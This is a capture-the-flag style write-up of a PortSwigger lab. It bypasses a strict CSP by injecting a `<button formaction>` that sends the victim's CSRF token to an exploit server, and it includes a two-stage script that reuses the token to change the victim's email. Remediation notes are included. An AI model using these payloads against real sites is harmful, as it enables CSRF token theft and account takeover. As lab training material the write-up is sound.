# Reflected XSS protected by very strict CSP, with dangling markup attack

**Category:** Cross-site scripting
**Level:** Practitioner
**Mechanism:** Strict CSP bypass via form hijacking — missing `form-action` directive lets an injected `<button formaction>` steal the CSRF token

**Lab URL:** https://portswigger.net/web-security/cross-site-scripting/contexts/lab-very-strict-csp-with-dangling-markup-attack

---

## Vulnerability

The `email` parameter is reflected into the account page, and a **strict CSP** blocks all
script execution (no inline, no external). Script-based XSS is therefore dead. But the CSP has
**no `form-action` directive**, so an injected `<button formaction=...>` can redirect the
page's form submission to an attacker server. Hijacking the form submits the victim's hidden
**CSRF token** to the attacker, who then replays it to change the victim's email — a CSP bypass
with no script running on the lab origin.

## Reconnaissance & Exploitation

Script payloads are blocked two ways: client-side validation on the change-email form, and the
CSP. Confirming CSP is the real wall — reflecting via the `email` query parameter:

```
/my-account?email=<img src onerror=alert(1)>
```

The payload reflects but doesn't run; DevTools console shows a CSP violation. Script is out.

The CSP lacks `form-action`, so the attack is **form hijacking**. The injection point lets an
HTML element be added to the page, so inject a `<button>` whose `formaction` points at the
exploit server, with `formmethod=get` so the submitted form data (including the CSRF token)
lands in the URL query string:

```
/my-account?email=blah@blah"><button class=button formaction=https://exploit-SERVER/exploit formmethod=get type=submit>Click me</button>
```

Clicking it submits the change-email form via GET to the exploit server → the victim's CSRF
token appears in the URL. The full attack is scripted on the exploit server so it runs in two
automatic stages against the simulated victim:

```html
<body>
<script>
const academyFrontend = "https://0af000c503840e728143d4a900d5003e.web-security-academy.net/";
const exploitServer = "https://exploit-0ad600e903ad0e0a8195d3d80155009d.exploit-server.net/exploit";

const csrf = new URL(location).searchParams.get('csrf');

if (csrf) {
  // Stage 2: token in hand — POST the email change with the stolen token
  const form = document.createElement('form');
  const email = document.createElement('input');
  const token = document.createElement('input');
  token.name = 'csrf';  token.value = csrf;
  email.name = 'email'; email.value = 'hacker@evil-user.net';
  form.method = 'post';
  form.action = `${academyFrontend}my-account/change-email`;
  form.append(email); form.append(token);
  document.documentElement.append(form);
  form.submit();
} else {
  // Stage 1: no token yet — send victim to the lab with the injected button (GET) that leaks it
  location = `${academyFrontend}my-account?email=blah@blah%22%3E%3Cbutton+class=button%20formaction=${exploitServer}%20formmethod=get%20type=submit%3EClick%20me%3C/button%3E`;
}
</script>
</body>
```

`Store` → `Deliver exploit to victim`. Stage 1 lands the victim on the lab page with the
injected button and "induces the click" (the label *Click me* is what makes the simulated user
click); the GET submission bounces back to the exploit server with `?csrf=...`. Stage 2 reads
that token and auto-POSTs the email change. The admin's email becomes `hacker@evil-user.net` —
lab solved.

## Impact

A strict CSP that fully blocks script XSS is bypassed to perform an authenticated state change
(email takeover, a step toward full account takeover) on the victim. CSP that omits
`form-action` leaves form hijacking open: an attacker reads CSRF tokens and redirects
privileged form submissions without ever running JavaScript on the target origin.

## Remediation

- Add **`form-action 'self'`** to the CSP so forms can only submit to the application's own
  origin — this directly closes the hijack.
- Fix the reflected XSS at the sink: context-aware output encoding of the `email` parameter so
  no HTML (`<button>` included) can be injected.
- Harden the change-email flow (re-authentication / correct anti-CSRF handling) so a leaked
  token alone can't authorise the change.

## References

- **OWASP:** A03:2021 Injection
- **CWE:** CWE-79 (Improper Neutralization of Input During Web Page Generation); CWE-1021 (Improper Restriction of Rendered UI Layers — form/UI redress); CWE-352 (CSRF — the stolen token authorises the change)

## Notes

- Key insight: a **strict CSP stops script, not markup**. When script is impossible, pivot to
  HTML-only injection — `<button formaction>`, `<form>`, dangling markup. The gap here is the
  missing `form-action` directive.
- `formaction` + `formmethod=get` is the token-exfil trick: overriding the form's action sends
  it to your server, and forcing GET puts the hidden CSRF token in the URL where JS can read it.
  (POST would hide it in the body.)
- Two-stage `if/else` on the same exploit page: first pass has no `?csrf` → bounce the victim to
  leak it; second pass has `?csrf` → use it. One payload handles both, fully automated.
- `Click me` matters — the lab's simulated user only clicks elements labelled "Click".
- This closes the XSS category: the progression ran contexts → filters → WAF → and finally CSP,
  where the exploit isn't script at all but hijacking what the CSP forgot to restrict.